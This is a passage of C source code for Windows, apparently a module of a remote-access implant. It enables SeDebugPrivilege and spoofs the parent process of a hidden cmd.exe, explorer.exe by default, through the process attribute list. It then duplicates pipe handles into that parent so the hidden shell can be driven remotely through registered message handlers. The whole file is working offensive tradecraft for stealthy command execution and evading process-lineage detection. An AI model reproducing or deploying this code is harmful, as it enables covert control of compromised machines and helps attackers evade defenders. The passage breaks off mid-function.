#include <windows.h>
#include <stdio.h>

#pragma message( "Compiling with DEBUGGING messages hardcoded in " __FILE__ )
#define _VERBOSE
#define DEBUG_LEVEL DEBUG_VERBOSE
#include "DebugOutput.h"
#include "LIB_Utilities.h"
#include "cJSON.h"

#include "LIB_InteractiveCommandPrompt.h"
#include "Internal_Functions.h"


#define SZ_InteractiveCommandPrompt_DEFAULT_COMMAND_PROMPT	"C:\\Windows\\System32\\cmd.exe"
#define SZ_InteractiveCommandPrompt_COMMAND_LINE_TERMINATOR	"\n"
#define DW_COMMAND_WAIT_TIME_MS		100
#define SZ_InteractiveCommandPrompt_DEFAULT_PARENT_PROCESS	"explorer.exe"
#define BUFSIZE						4096 

// Global variables
cJSON*				g_InteractiveCommandPrompt_lpJsonInteractiveCommandPromptConfig = NULL;
PROCESS_INFORMATION g_InteractiveCommandPrompt_CommandPromptProcessInfo;
STARTUPINFOEXA		g_InteractiveCommandPrompt_CommandPromptStartupInfo;

HANDLE hParentStd_OUT_Rd	= NULL;
HANDLE hParentStd_OUT_Wr	= NULL;
HANDLE hChildStd_OUT_Wr		= NULL;
HANDLE hParentStd_IN_Wr		= NULL;
HANDLE hParentStd_IN_Rd		= NULL;
HANDLE hChildStd_IN_Rd		= NULL;
HANDLE hChildStd_ERR_Wr		= NULL;



BOOL CurrentProcessAdjustToken(void)
{
	HANDLE				hToken;
	TOKEN_PRIVILEGES	sTP;

	if (m_InteractiveCommandPrompt_OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		if (!m_InteractiveCommandPrompt_LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &sTP.Privileges[0].Luid))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		sTP.PrivilegeCount = 1;
		sTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!m_InteractiveCommandPrompt_AdjustTokenPrivileges(hToken, 0, &sTP, sizeof(sTP), NULL, NULL))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		CloseHandle(hToken);
		return TRUE;
	}
	return FALSE;
}


DWORD GetPidByName(LPCSTR szProcessName)
{
	DWORD dwErrorCode = ERROR_SUCCESS;
	DWORD dwPid = 0;
	PROCESSENTRY32 pe;
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;

	//DBGPRINT(DEBUG_VERBOSE, TEXT("szProcessName:  %S"), szProcessName);

	// Create toolhelp hSnapshot
	hSnapshot = m_InteractiveCommandPrompt_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot)
	{
		dwErrorCode = GetLastError();
		DBGPRINT(
			DEBUG_ERROR,
			TEXT("m_InteractiveCommandPrompt_CreateToolhelp32Snapshot( %08x, %08x ) failed. (%08x)"),
			TH32CS_SNAPPROCESS, 
			0,
			dwErrorCode
		);
		//__leave;
	}
	else
	{
		ZeroMemory(&pe, sizeof(pe));
		pe.dwSize = sizeof(pe);

		// Walkthrough all process entries
		if (m_InteractiveCommandPrompt_Process32First(hSnapshot, &pe))
		{
			do
			{
				//DBGPRINT(DEBUG_VERBOSE, TEXT("pe.szExeFile:  %S"), pe.szExeFile);
				// Check the current process name against the one we are looking for
				if ( 0 == strcmp(pe.szExeFile, szProcessName))
				{
					dwPid = pe.th32ProcessID;
					break;
				}
			} while (m_InteractiveCommandPrompt_Process32Next(hSnapshot, &pe));
		}

		CloseHandle(hSnapshot);
	}

	return dwPid;
}


DWORD WINAPI InteractiveCommandPromptInitialization(
	IN	PBYTE	lpInputBuffer,
	IN	DWORD	dwInputBufferSize,
	OUT PBYTE*	lppOutputBuffer,
	OUT PDWORD	lpdwOutputBufferSize
)
{
	DWORD	dwErrorCode = ERROR_SUCCESS;
	DWORD	dwTempErrorCode = ERROR_SUCCESS;

	cJSON*	lpJsonInteractiveCommandPromptInitializeInput = NULL;
	cJSON*	lpJsonInteractiveCommandPromptConfiguration = NULL;
	cJSON*	lpJsonInteractiveCommandPromptConfigurationParentProcess = NULL;
	cJSON*	lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine = NULL;

	BOOL	bRegisterResult = FALSE;

	cJSON*	lpJsonInteractiveCommandPromptInitializeOutput = NULL;
	CHAR*	szInteractiveCommandPromptOutput = NULL;
	DWORD	dwInteractiveCommandPromptOutputSize = 0;


	CHAR	szCommandPromptCommandLine[MAX_PATH];
	CHAR	szParentProcess[MAX_PATH];

	SECURITY_ATTRIBUTES saAttr;

	DWORD	dwFlags				= 0;

	DWORD	dwPipeBytes			= 0;
	CHAR	chBuf[BUFSIZE];

	DWORD	dwPid				= 0;
	SIZE_T	cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE	hParentProcess		= NULL;

	__try
	{
		__try
		{
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpInputBuffer:        %p"), lpInputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwInputBufferSize:    %d"), dwInputBufferSize);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lppOutputBuffer:      %p"), lppOutputBuffer);
			DBGPRINT(DEBUG_VERBOSE, TEXT("lpdwOutputBufferSize: %p"), lpdwOutputBufferSize);

			/********************************************************************************
				Check arguments
			********************************************************************************/
			//if (NULL == lppOutputBuffer)
			//{
			//	dwErrorCode = ERROR_BAD_ARGUMENTS;
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("lppOutputBuffer is NULL.\n")
			//	);
			//	__leave;
			//}
			if (NULL == lpInputBuffer)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("lpInputBuffer is NULL.\n")
				);
				__leave;
			}

			
			/********************************************************************************
				Convert input string into JSON
			********************************************************************************/
			lpJsonInteractiveCommandPromptInitializeInput = cJSON_Parse((CHAR*)lpInputBuffer);
			if (NULL == lpJsonInteractiveCommandPromptInitializeInput)
			{
				dwErrorCode = ERROR_BAD_ARGUMENTS;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_Parse(%p) failed."),
					(CHAR*)lpInputBuffer
				);
				__leave;
			}

			// Set the local module's configuration to the input configuration
			g_InteractiveCommandPrompt_lpJsonInteractiveCommandPromptConfig = lpJsonInteractiveCommandPromptInitializeInput;
			// and then null the input configuration so it isn't free'd in the finally
			lpJsonInteractiveCommandPromptInitializeInput = NULL;


			/********************************************************************************
				Initialize internal functions
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Initialize_InteractiveCommandPrompt_Kernel32_Functions()"));
			dwErrorCode = Initialize_InteractiveCommandPrompt_Kernel32_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Initialize_InteractiveCommandPrompt_Kernel32_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}

			//DBGPRINT(DEBUG_VERBOSE, TEXT("Initialize_InteractiveCommandPrompt_Advapi32_Functions()"));
			dwErrorCode = Initialize_InteractiveCommandPrompt_Advapi32_Functions();
			if (ERROR_SUCCESS != dwErrorCode)
			{
				DBGPRINT(DEBUG_ERROR, TEXT("Initialize_InteractiveCommandPrompt_Advapi32_Functions() failed.(%08x)"), dwErrorCode);
				__leave;
			}

			
			/********************************************************************************
				Perform additional initialization actions
			*******************************************************************************/
			ZeroMemory(szCommandPromptCommandLine, sizeof(szCommandPromptCommandLine));
			ZeroMemory(szParentProcess, sizeof(szParentProcess));
			ZeroMemory(&g_InteractiveCommandPrompt_CommandPromptProcessInfo, sizeof(g_InteractiveCommandPrompt_CommandPromptProcessInfo));
			
			// Get the InteractiveCommandPrompt_Request_Entry from the g_InteractiveCommandPrompt_lpJsonInteractiveCommandPromptConfig
			lpJsonInteractiveCommandPromptConfiguration = cJSON_GetObjectItemCaseSensitive(g_InteractiveCommandPrompt_lpJsonInteractiveCommandPromptConfig, InteractiveCommandPrompt_Configuration);
			if (NULL == lpJsonInteractiveCommandPromptConfiguration)
			{
				dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					g_InteractiveCommandPrompt_lpJsonInteractiveCommandPromptConfig,
					InteractiveCommandPrompt_Configuration
				);
				__leave;
			}

			// Get the InteractiveCommandPrompt_Configuration_ParentProcess from the InteractiveCommandPrompt_Request_Entry
			//   or use the default ParentProcess if all else fails or one isn't provided
			lpJsonInteractiveCommandPromptConfigurationParentProcess = cJSON_GetObjectItemCaseSensitive(lpJsonInteractiveCommandPromptConfiguration, InteractiveCommandPrompt_Configuration_ParentProcess);
			if (NULL == lpJsonInteractiveCommandPromptConfigurationParentProcess)
			{
				//dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("lpJsonInteractiveCommandPromptConfigurationParentProcess = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInteractiveCommandPromptConfiguration,
					InteractiveCommandPrompt_Configuration_ParentProcess
				);
				//__leave;

				strcpy(szParentProcess, SZ_InteractiveCommandPrompt_DEFAULT_PARENT_PROCESS);
			}
			else
			{
				if (
					!cJSON_IsString(lpJsonInteractiveCommandPromptConfigurationParentProcess) ||
					(NULL == lpJsonInteractiveCommandPromptConfigurationParentProcess->valuestring)
					)
				{
					//dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_WARNING,
						TEXT("cJSON_IsString(%p) failed."),
						lpJsonInteractiveCommandPromptConfigurationParentProcess
					);
					//__leave;

					strcpy(szParentProcess, SZ_InteractiveCommandPrompt_DEFAULT_PARENT_PROCESS);
				}
				else
				{
					strcpy(szParentProcess, lpJsonInteractiveCommandPromptConfigurationParentProcess->valuestring);
				}
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("szParentProcess: %S"), szParentProcess);

			// Get the InteractiveCommandPrompt_Configuration_CommandPromptCommandLine from the InteractiveCommandPrompt_Request_Entry
			//   or use the default CommandPromptCommandLine if all else fails or one isn't provided
			lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine = cJSON_GetObjectItemCaseSensitive(lpJsonInteractiveCommandPromptConfiguration, InteractiveCommandPrompt_Configuration_CommandPrompt);
			if (NULL == lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine)
			{
				//dwErrorCode = ERROR_OBJECT_NOT_FOUND;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine = cJSON_GetObjectItemCaseSensitive(%p, %S) failed."),
					lpJsonInteractiveCommandPromptConfiguration,
					InteractiveCommandPrompt_Configuration_CommandPrompt
				);
				//__leave;

				strcpy(szCommandPromptCommandLine, SZ_InteractiveCommandPrompt_DEFAULT_COMMAND_PROMPT);
			}
			else
			{
				if (
					!cJSON_IsString(lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine) ||
					(NULL == lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine->valuestring)
					)
				{
					//dwErrorCode = ERROR_OBJECT_NOT_FOUND;
					DBGPRINT(
						DEBUG_WARNING,
						TEXT("cJSON_IsString(%p) failed."),
						lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine
					);
					//__leave;

					strcpy(szCommandPromptCommandLine, SZ_InteractiveCommandPrompt_DEFAULT_COMMAND_PROMPT);
				}
				else
				{
					strcpy(szCommandPromptCommandLine, lpJsonInteractiveCommandPromptConfigurationCommandPromptCommandLine->valuestring);
				}
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("szCommandPromptCommandLine: %S"), szCommandPromptCommandLine);


			// Adjust current privilegs
			CurrentProcessAdjustToken();

			// Get the PID of the new parent process
			dwPid = GetPidByName(szParentProcess);
			if (0 == dwPid)
			{
				dwErrorCode = ERROR_FILE_NOT_FOUND;
				DBGPRINT(DEBUG_ERROR, TEXT("GetPidByName(%S) failed."), szParentProcess);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("dwPid:          %d"), dwPid);

			// Get a handle to the new parent process
			hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
			if (NULL == hParentProcess)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("OpenProcess( %08x, %08x, %d ) failed. (%08x)"),
					PROCESS_ALL_ACCESS, 
					FALSE, 
					dwPid,
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("hParentProcess: %p"), hParentProcess);

			// Get the size required for a process thread attribute block containing 1 attribute
			if (FALSE == m_InteractiveCommandPrompt_InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize))
			{
				dwErrorCode = GetLastError();
				//DBGPRINT(
				//	DEBUG_WARNING,
				//	TEXT("m_InteractiveCommandPrompt_InitializeProcThreadAttributeList failed. (%08x)"),
				//	dwErrorCode
				//);
				dwErrorCode = ERROR_SUCCESS;
			}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("cbAttributeListSize:          %d"), cbAttributeListSize);

			// Allocate memory for the thread attribute list
			pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbAttributeListSize);
			if (NULL == pAttributeList)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("HeapAlloc failed. (%08x)"),
					dwErrorCode
				);
				__leave;
			}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("pAttributeList:          %p"), pAttributeList);

			// Initialize the process thread attibute block to contain 1 attribute
			//DBGPRINT(
			//	DEBUG_VERBOSE,
			//	TEXT("m_InteractiveCommandPrompt_InitializeProcThreadAttributeList(%p, %d, %d, %p)..."),
			//	pAttributeList,
			//	1,
			//	0,
			//	&cbAttributeListSize
			//);
			if (FALSE == m_InteractiveCommandPrompt_InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize))
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_InteractiveCommandPrompt_InitializeProcThreadAttributeList failed. (%08x)"),
					dwErrorCode
				);
				__leave;
			}

			// Update the process thread attribute block with the parent process handle
			//DBGPRINT(
			//	DEBUG_VERBOSE,
			//	TEXT("m_InteractiveCommandPrompt_UpdateProcThreadAttribute( %p, %08x, %p, %p, %d, %p, %p )..."),
			//	pAttributeList,
			//	0,
			//	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
			//	&hParentProcess,
			//	sizeof(HANDLE),
			//	NULL,
			//	NULL
			//);
			if (FALSE == m_InteractiveCommandPrompt_UpdateProcThreadAttribute(
				pAttributeList,							// lpAttributeList
				0,										// dwFlags
				PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,	// Attribute
				&hParentProcess,						// lpValue
				sizeof(HANDLE),							// cbSize
				NULL,									// lpPreviousValue
				NULL									// lpReturnSize
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_InteractiveCommandPrompt_UpdateProcThreadAttribute failed. (%08x)"),
					dwErrorCode
				);
				__leave;
			}

			// Create a security attribute struct for the pipes (not inheritable)
			ZeroMemory(&saAttr, sizeof(saAttr));
			saAttr.nLength				= sizeof(SECURITY_ATTRIBUTES);
			saAttr.bInheritHandle		= FALSE;
			saAttr.lpSecurityDescriptor = NULL;
			// Create the stdout pipe
			//DBGPRINT(
			//	DEBUG_VERBOSE,
			//	TEXT("m_InteractiveCommandPrompt_CreatePipe(%p, %p, %p, %08x)..."),
			//	&hParentStd_OUT_Rd,
			//	&hParentStd_OUT_Wr,
			//	&saAttr,
			//	0
			//);
			if ( FALSE == m_InteractiveCommandPrompt_CreatePipe(
				&hParentStd_OUT_Rd,
				&hParentStd_OUT_Wr,
				&saAttr, 
				0
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR, 
					TEXT("m_InteractiveCommandPrompt_CreatePipe(%p, %p, %p, %08x) failed. (%08x)"), 
					&hParentStd_OUT_Rd,
					&hParentStd_OUT_Wr,
					&saAttr,
					0,
					dwErrorCode
				);
				__leave;
			}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("hParentStd_OUT_Rd:  %p"), hParentStd_OUT_Rd);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("hParentStd_OUT_Wr:  %p"), hParentStd_OUT_Wr);

			// Create the stdin pipe
			//DBGPRINT(
			//	DEBUG_VERBOSE,
			//	TEXT("m_InteractiveCommandPrompt_CreatePipe(%p, %p, %p, %08x)..."),
			//	&hParrentStd_IN_Rd,
			//	&hParrentStd_IN_Wr,
			//	&saAttr,
			//	0
			//);
			if (FALSE == m_InteractiveCommandPrompt_CreatePipe(
				&hParentStd_IN_Rd,
				&hParentStd_IN_Wr,
				&saAttr,
				0
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_InteractiveCommandPrompt_CreatePipe(%p, %p, %p, %08x) failed. (%08x)"),
					&hParentStd_IN_Rd,
					&hParentStd_IN_Wr,
					&saAttr,
					0,
					dwErrorCode
				);
				__leave;
			}
			//DBGPRINT(DEBUG_VERBOSE, TEXT("hParrentStd_IN_Rd:      %p"), hParrentStd_IN_Rd);
			//DBGPRINT(DEBUG_VERBOSE, TEXT("hParrentStd_IN_Wr:  %p"), hParrentStd_IN_Wr);

			// Duplicate the write end of the stdout pipe for the child to write strderr to
			// This duplicate write end for the child needs to be in the spoofed parent process
			if (FALSE == m_InteractiveCommandPrompt_DuplicateHandle(
				GetCurrentProcess(),
				hParentStd_OUT_Wr,
				//GetCurrentProcess(),
				hParentProcess,
				&hChildStd_ERR_Wr,		// Address of new handle in the spoofed parent process
				0,
				TRUE,					// Make it inheritable for the child to inherit from the spoofed parent
				DUPLICATE_SAME_ACCESS
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_InteractiveCommandPrompt_DuplicateHandle(%p, %p, %p, %p, %08x, %08x, %08x) failed. (%08x)"),
					GetCurrentProcess(),
					hParentStd_OUT_Wr,
					hParentProcess,
					&hChildStd_ERR_Wr,		// Address of new handle in the spoofed parent process
					0,
					TRUE,					// Make it inheritable for the child to inherit from the spoofed parent
					DUPLICATE_SAME_ACCESS,
					dwErrorCode
				);
				__leave;
			}

			// Duplicate the write end of the stdout pipe for the child to write stdout to
			// This duplicate write end for the child needs to be in the spoofed parent process
			if (FALSE == m_InteractiveCommandPrompt_DuplicateHandle(
				GetCurrentProcess(),
				hParentStd_OUT_Wr,
				hParentProcess,
				&hChildStd_OUT_Wr,		// Address of new handle in the spoofed parent process
				0,
				TRUE,					// Make it inheritable for the child to inherit from the spoofed parent
				DUPLICATE_SAME_ACCESS
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_InteractiveCommandPrompt_DuplicateHandle(%p, %p, %p, %p, %08x, %08x, %08x) failed. (%08x)"),
					GetCurrentProcess(),
					hParentStd_OUT_Wr,
					hParentProcess,
					&hChildStd_OUT_Wr,		// Address of new handle in the spoofed parent process
					0,
					TRUE,					// Make it inheritable for the child to inherit from the spoofed parent
					DUPLICATE_SAME_ACCESS,
					dwErrorCode
				);
				__leave;
			}

			// Duplicate the read end of the stdin pipe for the child to read stdin from
			// This duplicate read end for the child needs to be in the spoofed parent process
			if (FALSE == m_InteractiveCommandPrompt_DuplicateHandle(
				GetCurrentProcess(),
				hParentStd_IN_Rd,
				hParentProcess,
				&hChildStd_IN_Rd,			// Address of new handle in the spoofed parent process
				0,
				TRUE,						// Make it inheritable for the child to inherit from the spoofed parent
				DUPLICATE_SAME_ACCESS
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_InteractiveCommandPrompt_DuplicateHandle(%p, %p, %p, %p, %08x, %08x, %08x) failed. (%08x)"),
					GetCurrentProcess(),
					hParentStd_IN_Rd,
					hParentProcess,
					&hChildStd_IN_Rd,		// Address of new handle in the spoofed parent process
					0,
					TRUE,					// Make it inheritable for the child to inherit from the spoofed parent
					DUPLICATE_SAME_ACCESS,
					dwErrorCode
				);
				__leave;
			}

			// Close inheritable copies of the handles you do not want to be inherited.
			if (FALSE == CloseHandle(hParentStd_OUT_Wr))
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("CloseHandle(%p) failed. (%08x)"),
					hParentStd_OUT_Wr,
					dwErrorCode
				);
				__leave;
			}
			if (FALSE == CloseHandle(hParentStd_IN_Rd))
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("CloseHandle(%p) failed. (%08x)"),
					hParentStd_IN_Rd,
					dwErrorCode
				);
				__leave;
			}

			// Set up the PROCESS_INFORMATION struct
			ZeroMemory(&g_InteractiveCommandPrompt_CommandPromptProcessInfo, sizeof(g_InteractiveCommandPrompt_CommandPromptProcessInfo));

			// Set up the STARTUPINFO struct
			ZeroMemory(&g_InteractiveCommandPrompt_CommandPromptStartupInfo, sizeof(g_InteractiveCommandPrompt_CommandPromptStartupInfo));
			g_InteractiveCommandPrompt_CommandPromptStartupInfo.lpAttributeList			= pAttributeList;		// Spoofed parent process
			g_InteractiveCommandPrompt_CommandPromptStartupInfo.StartupInfo.cb			= sizeof(g_InteractiveCommandPrompt_CommandPromptStartupInfo);
			g_InteractiveCommandPrompt_CommandPromptStartupInfo.StartupInfo.hStdError	= hChildStd_ERR_Wr;		// Redirect stderr to the write handle of the stdout pipe duplicated into the spoofed parent
			g_InteractiveCommandPrompt_CommandPromptStartupInfo.StartupInfo.hStdOutput	= hChildStd_OUT_Wr;		// Redirect stdout to the write handle of the stdout pipe duplicated into the spoofed parent
			g_InteractiveCommandPrompt_CommandPromptStartupInfo.StartupInfo.hStdInput	= hChildStd_IN_Rd;		// Redirect stdin to the read handle of the stdin pipe duplicated into the spoofed parent
			g_InteractiveCommandPrompt_CommandPromptStartupInfo.StartupInfo.wShowWindow	= SW_HIDE;				// Do not show the process window
			g_InteractiveCommandPrompt_CommandPromptStartupInfo.StartupInfo.dwFlags =					
				STARTF_USESTDHANDLES |													// Use the std redirection handles from the struct
				STARTF_USESHOWWINDOW |													// Use the window show setting from the struct
				0;

			// Set up the CreateProcess flags
			dwFlags = 
				CREATE_NEW_CONSOLE |													// Create a new console for the child process
				CREATE_NO_WINDOW |														// Do not create a window for the child process
				EXTENDED_STARTUPINFO_PRESENT |											// The startup info contains extended information
				0;

			// Create the child process.
			//DBGPRINT(
			//	DEBUG_VERBOSE,
			//	TEXT("m_InteractiveCommandPrompt_CreateProcessA( %p, %p, %p, %p, %08x, %08x, %p, %p, %p, %p )"),
			//	NULL,
			//	szCommandPromptCommandLine,
			//	NULL,
			//	NULL,
			//	TRUE,
			//	dwFlags,
			//	NULL,
			//	NULL,
			//	&g_InteractiveCommandPrompt_CommandPromptStartupInfo.StartupInfo,
			//	&g_InteractiveCommandPrompt_CommandPromptProcessInfo
			//);
			if (NULL == m_InteractiveCommandPrompt_CreateProcessA(
				NULL,									// No module name (use command line)
				szCommandPromptCommandLine,				// Command line
				NULL,									// Process handle not inheritable
				NULL,									// Thread handle not inheritable
				TRUE,									// Handles are inherited from spoofed parent to include the stderr, stdout, stdin handles
				dwFlags,								// Process creation flags
				NULL,									// Environment block not specifed so use parent's environment block
				NULL,									// Starting directory not specifed so use parent's starting directory 
				&g_InteractiveCommandPrompt_CommandPromptStartupInfo.StartupInfo,// Pointer to STARTUPINFO structure inside the EXTENDEDINFO
				&g_InteractiveCommandPrompt_CommandPromptProcessInfo				// Pointer to PROCESS_INFORMATION structure
			)
				)
			{
				dwErrorCode = GetLastError();
				DBGPRINT(
					DEBUG_ERROR,
					TEXT("m_InteractiveCommandPrompt_CreateProcessA( %p, %p, %p, %p, %08x, %08x, %p, %p, %p, %p ) failed. (%08x)"),
					NULL,									// No module name (use command line)
					szCommandPromptCommandLine,				// Command line
					NULL,									// Process handle not inheritable
					NULL,									// Thread handle not inheritable
					TRUE,									// Handles are inherited from spoofed parent to include the stderr, stdout, stdin handles
					dwFlags,								// Process creation flags
					NULL,									// Environment block not specifed so use parent's environment block
					NULL,									// Starting directory not specifed so use parent's starting directory 
					&g_InteractiveCommandPrompt_CommandPromptStartupInfo.StartupInfo,// Pointer to STARTUPINFO structure inside the EXTENDEDINFO
					&g_InteractiveCommandPrompt_CommandPromptProcessInfo,			// Pointer to PROCESS_INFORMATION structure
					dwErrorCode
				);
				__leave;
			}
			DBGPRINT(DEBUG_VERBOSE, TEXT("g_InteractiveCommandPrompt_CommandPromptProcessInfo.dwProcessId: %d"), g_InteractiveCommandPrompt_CommandPromptProcessInfo.dwProcessId);
			DBGPRINT(DEBUG_VERBOSE, TEXT("g_InteractiveCommandPrompt_CommandPromptProcessInfo.hProcess:    %p"), g_InteractiveCommandPrompt_CommandPromptProcessInfo.hProcess);
			
			// Destroty the process thread attributes
			m_InteractiveCommandPrompt_DeleteProcThreadAttributeList(pAttributeList);
			
			// Close the handle to the parent process
			if (NULL != hParentProcess)
			{
				CloseHandle(hParentProcess);
				hParentProcess = NULL;
			}
			
			// Can't close the child process handles because they were duplicated into and inherited from the spoofed parent process
			//if (FALSE == CloseHandle(hChildStd_OUT_Wr))
			//{
			//	dwErrorCode = GetLastError();
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("CloseHandle(%p) failed. (%08x)"),
			//		hChildStd_OUT_Wr,
			//		dwErrorCode
			//	);
			//	__leave;
			//}
			//if (FALSE == CloseHandle(hChildStd_IN_Rd))
			//{
			//	dwErrorCode = GetLastError();
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("CloseHandle(%p) failed. (%08x)"),
			//		hChildStd_IN_Rd,
			//		dwErrorCode
			//	);
			//	__leave;
			//}
			//if (FALSE == CloseHandle(hChildStd_ERR_Wr))
			//{
			//	dwErrorCode = GetLastError();
			//	DBGPRINT(
			//		DEBUG_ERROR,
			//		TEXT("CloseHandle(%p) failed. (%08x)"),
			//		hChildStd_ERR_Wr,
			//		dwErrorCode
			//	);
			//	__leave;
			//}

			// Read output from the parent's copy of the read end of the stdout pipe
			while(true)
			{
				ZeroMemory(chBuf, sizeof(chBuf));
				dwPipeBytes = 0;
				// Wait a little bit to allow the child process to write to the pipe
				Sleep(DW_COMMAND_WAIT_TIME_MS);
				// First check to see if there is anything to read so we don't hang
				if (FALSE == m_InteractiveCommandPrompt_PeekNamedPipe(hParentStd_OUT_Rd, NULL, 0, NULL, &dwPipeBytes, NULL))
				{
					if (0 == dwPipeBytes)
					{
						//DBGPRINT(DEBUG_ERROR, TEXT("No more bytes to read"));
						break;
					}
					else
					{
						dwErrorCode = GetLastError();
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("m_InteractiveCommandPrompt_PeekNamedPipe( %p, %p, %d, %p, %p, %p ) failed. (%08x)"),
							hParentStd_OUT_Rd,
							NULL, 
							0, 
							NULL, 
							&dwPipeBytes, 
							NULL,
							dwErrorCode
						);
						__leave;
					}
				}
				//DBGPRINT(DEBUG_VERBOSE, TEXT("dwPipeBytes:    %d"), dwPipeBytes);
				if (0 == dwPipeBytes)
				{
					//DBGPRINT(DEBUG_VERBOSE, TEXT("No more bytes to read"));
					break;
				}

				// Read the bytes from the parent's end of the stdout pipe
				if (FALSE == ReadFile(hParentStd_OUT_Rd, chBuf, BUFSIZE, &dwPipeBytes, NULL))
				{
					if (0 == dwPipeBytes)
					{
						//DBGPRINT(DEBUG_VERBOSE, TEXT("No more bytes to read"));
						break;
					}
					else
					{
						dwErrorCode = GetLastError();
						DBGPRINT(
							DEBUG_ERROR,
							TEXT("ReadFile( %p, %p, %d, %p, %p ) failed. (%08x)"),
							hParentStd_OUT_Rd,
							chBuf,
							BUFSIZE,
							&dwPipeBytes,
							NULL,
							dwErrorCode
						);
						__leave;
					}
				}
				//DBGPRINT(DEBUG_VERBOSE, TEXT("dwPipeBytes:    %d"), dwPipeBytes);
				//dwErrorCode = GetLastError();
				//DBGPRINT(DEBUG_VERBOSE, TEXT("dwErrorCode:    %d (%08x)"), dwErrorCode, dwErrorCode);

				// Repeat the read operation on the parent's end of the stdout pipe until there are no more bytes to read
			} // end for loop reading output from child process


			/********************************************************************************
				Register callback functions
			********************************************************************************/
			DBGPRINT(DEBUG_VERBOSE, TEXT("Register InteractiveCommandPrompt_Request"));
			bRegisterResult = RegisterModuleMessageHandler(
				g_InteractiveCommandPrompt_lpJsonInteractiveCommandPromptConfig,
				InteractiveCommandPrompt_Request,
				InteractiveCommandPromptCallbackInterface
			);
			if (FALSE == bRegisterResult)
			{
				//dwErrorCode = ERROR_BAD_PROVIDER;
				DBGPRINT(
					DEBUG_WARNING,
					TEXT("RegisterModuleMessageHandler(%p, %S, %p) failed."),
					g_InteractiveCommandPrompt_lpJsonInteractiveCommandPromptConfig,
					InteractiveCommandPrompt_Request,
					InteractiveCommandPromptCallbackInterface
				);
				//__leave;
			}
			else
			{
				DBGPRINT(DEBUG_VERBOSE, TEXT("Register InteractiveCommandPrompt_Request was successful."));
			}


			/********************************************************************************
				Create output message based on results
			********************************************************************************/
			//DBGPRINT(DEBUG_VERBOSE, TEXT("Create output message based on results"));
			//szInteractiveCommandPromptOutput = cJSON_Print(lpJsonInteractiveCommandPromptInitializeOutput);
			//if (NULL == szInteractiveCommandPromptOutput)
			//{
			//	dwErrorCode = ERROR_OBJECT_NOT_FOUND;
			//	DBGPRINT(
